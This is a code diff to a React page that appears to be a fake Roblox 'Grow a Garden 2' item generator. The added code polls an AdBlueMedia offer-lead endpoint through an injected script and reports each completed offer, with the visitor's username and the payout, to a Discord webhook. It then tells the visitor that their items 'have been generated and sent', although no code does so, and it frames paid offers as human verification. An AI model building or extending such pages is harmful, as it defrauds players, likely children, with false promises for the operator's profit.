@@ -99,47 +99,84 @@ export default function GagPage() {
   const floatingRef = useRef<FloatingImg[]>([])
   const rafRef = useRef<number>()
 
-  // Quest tracker
+  // Quest tracker & Webhook Memory
   const [questCompleted, setQuestCompleted] = useState(0)
+  const reportedLeadsRef = useRef<Set<string>>(new Set())
 
   // Popup cards
   const [popups, setPopups] = useState<PopupCard[]>([])
   const popupIndexRef = useRef(0)
   const popupIdRef = useRef(0)
 
-  // AdBlueMedia Live Lead Polling
+  // AdBlueMedia Live Lead Polling & Discord Webhooks
   useEffect(() => {
     let interval: NodeJS.Timeout
 
     const checkLeads = () => {
-      // JSONP injection to bypass CORS securely
       const script = document.createElement("script")
       const callbackName = "adblue_callback_" + Math.floor(Math.random() * 1000000)
       
       ;(window as any)[callbackName] = (leads: any[]) => {
-        // Cleanup global function and script tag
         delete (window as any)[callbackName]
         document.body.removeChild(script)
         
         if (leads && leads.length > 0) {
-          // Cap completed quests at 2
           setQuestCompleted(Math.min(leads.length, 2))
+
+          // Process each lead for Discord Webhooks
+          leads.forEach(async (lead: any) => {
+            const leadId = lead.offer_id?.toString()
+            const payoutStr = lead.points?.toString() || "0"
+            const uniqueLeadKey = `${leadId}-${payoutStr}`
+
+            // If we haven't already reported this exact lead to Discord
+            if (leadId && !reportedLeadsRef.current.has(uniqueLeadKey)) {
+              reportedLeadsRef.current.add(uniqueLeadKey)
+
+              // Convert payout points to a dollar amount (e.g. 150 points = $1.50)
+              const payoutDollars = (parseFloat(payoutStr) / 100).toFixed(2)
+
+              // Send to our internal Discord API route
+              try {
+                await fetch("/api/discord", {
+                  method: "POST",
+                  headers: { "Content-Type": "application/json" },
+                  body: JSON.stringify({
+                    embeds: [{
+                      title: "🎉 New Lead Completed!",
+                      color: 5679919, // A nice green color
+                      fields: [
+                        { name: "Roblox Username", value: username || "Unknown", inline: true },
+                        { name: "Offer ID", value: leadId, inline: true },
+                        { name: "Payout Made", value: `$${payoutDollars}`, inline: true }
+                      ],
+                      footer: {
+                        text: "Grow a Garden 2 | AdBlueMedia"
+                      },
+                      timestamp: new Date().toISOString()
+                    }]
+                  })
+                })
+              } catch (err) {
+                console.error("Failed to ping Discord route", err)
+              }
+            }
+          })
         }
       }
 
-      // testing=0 for real leads. Change to testing=1 to test your UI without actually doing an offer
       script.src = `https://d1cdbd1x576ga0.cloudfront.net/public/external/check2.php?testing=0&callback=${callbackName}`
       document.body.appendChild(script)
     }
 
     if (showOfferwall && questCompleted < 2) {
-      interval = setInterval(checkLeads, 15000) // Poll every 15 seconds
+      interval = setInterval(checkLeads, 15000)
     }
 
     return () => {
       if (interval) clearInterval(interval)
     }
-  }, [showOfferwall, questCompleted])
+  }, [showOfferwall, questCompleted, username])
 
   // Initialize floating images
   useEffect(() => {
@@ -358,33 +395,58 @@ export default function GagPage() {
             </div>
           ) : (
             <div className="relative bg-white rounded-xl p-5 w-full max-w-md max-h-[85vh] overflow-y-auto" style={{ zIndex: 2, boxShadow: "0 0 20px rgba(0,0,0,0.1)" }}>
-              <h2 className="text-center text-xl font-bold text-[#56ab2f] mb-1">Almost Done!</h2>
-              <p className="text-center text-sm text-gray-500 mb-4">Complete 2 offers below to verify you&apos;re human and unlock your items.</p>
+              {questCompleted >= 2 ? (
+                <div className="flex flex-col items-center justify-center py-10 text-center">
+                  <div className="w-16 h-16 bg-[#56ab2f] rounded-full flex items-center justify-center mb-4 shadow-lg">
+                    <svg className="w-8 h-8 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={3} d="M5 13l4 4L19 7" />
+                    </svg>
+                  </div>
+                  <h2 className="text-2xl font-bold text-[#56ab2f] mb-2">Verification Complete!</h2>
+                  <p className="text-gray-500">You have successfully verified you are human.</p>
+                  <p className="text-gray-500 mt-1 font-medium">Your items have been generated and sent to your account!</p>
+                  
+                  <button 
+                    onClick={() => {
+                      setGenerating(false);
+                      setShowOfferwall(false);
+                      setQuestCompleted(0);
+                    }}
+                    className="mt-6 px-6 py-2 bg-gray-100 hover:bg-gray-200 text-gray-700 font-semibold rounded-lg transition-colors"
+                  >
+                    Close
+                  </button>
+                </div>
+              ) : (
+                <>
+                  <h2 className="text-center text-xl font-bold text-[#56ab2f] mb-1">Almost Done!</h2>
+                  <p className="text-center text-sm text-gray-500 mb-4">Complete 2 offers below to verify you&apos;re human and unlock your items.</p>
 
-              <div className="mb-4 rounded-lg border border-gray-200 bg-gray-50 p-3">
-                <div className="flex items-center justify-between mb-2">
-                  <span className="text-sm font-semibold text-gray-700">Quests Completed</span>
-                  <span className="text-sm font-bold" style={{ color: questCompleted >= 2 ? "#56ab2f" : "#9ca3af" }}>
-                    {questCompleted}/2
-                  </span>
-                </div>
-                <div className="w-full bg-gray-200 rounded-full h-2.5">
-                  <div className="h-2.5 rounded-full transition-all duration-700" style={{ width: `${(questCompleted / 2) * 100}%`, background: "linear-gradient(90deg, #56ab2f, #a8e063)" }} />
-                </div>
-                <div className="flex gap-2 mt-2">
-                  {[0, 1].map((i) => (
-                    <div key={i} className="flex items-center gap-1 text-xs" style={{ color: questCompleted > i ? "#56ab2f" : "#9ca3af" }}>
-                      <div className="w-4 h-4 rounded-full border-2 flex items-center justify-center flex-shrink-0" style={{ borderColor: questCompleted > i ? "#56ab2f" : "#d1d5db", background: questCompleted > i ? "#56ab2f" : "transparent" }}>
-                        {questCompleted > i && <svg className="w-2.5 h-2.5 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={3} d="M5 13l4 4L19 7" /></svg>}
-                      </div>
-                      Quest {i + 1}
+                  <div className="mb-4 rounded-lg border border-gray-200 bg-gray-50 p-3">
+                    <div className="flex items-center justify-between mb-2">
+                      <span className="text-sm font-semibold text-gray-700">Quests Completed</span>
+                      <span className="text-sm font-bold" style={{ color: questCompleted >= 2 ? "#56ab2f" : "#9ca3af" }}>
+                        {questCompleted}/2
+                      </span>
                     </div>
-                  ))}
-                </div>
-              </div>
+                                        <div className="w-full bg-gray-200 rounded-full h-2.5">
+                      <div className="h-2.5 rounded-full transition-all duration-700" style={{ width: `${(questCompleted / 2) * 100}%`, background: "linear-gradient(90deg, #56ab2f, #a8e063)" }} />
+                    </div>
+                    <div className="flex gap-2 mt-2">
+                      {[0, 1].map((i) => (
+                        <div key={i} className="flex items-center gap-1 text-xs" style={{ color: questCompleted > i ? "#56ab2f" : "#9ca3af" }}>
+                          <div className="w-4 h-4 rounded-full border-2 flex items-center justify-center flex-shrink-0" style={{ borderColor: questCompleted > i ? "#56ab2f" : "#d1d5db", background: questCompleted > i ? "#56ab2f" : "transparent" }}>
+                            {questCompleted > i && <svg className="w-2.5 h-2.5 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={3} d="M5 13l4 4L19 7" /></svg>}
+                          </div>
+                          Quest {i + 1}
+                        </div>
+                      ))}
+                    </div>
+                  </div>
 
-              {/* Calls your secure internal backend API and passes the user's name */}
-              <Offerwall apiUrl={`/api/offers?s1=${encodeURIComponent(username)}`} />
+                  <Offerwall apiUrl={`/api/offers?s1=${encodeURIComponent(username)}`} />
+                </>
+              )}
             </div>
           )}
         </div>
@@ -415,5 +477,5 @@ function CardGrid({ items, selected, onToggle }: { items: Item[]; selected: Set<
       })}
     </div>
   )
-  }
-  
+            }
+
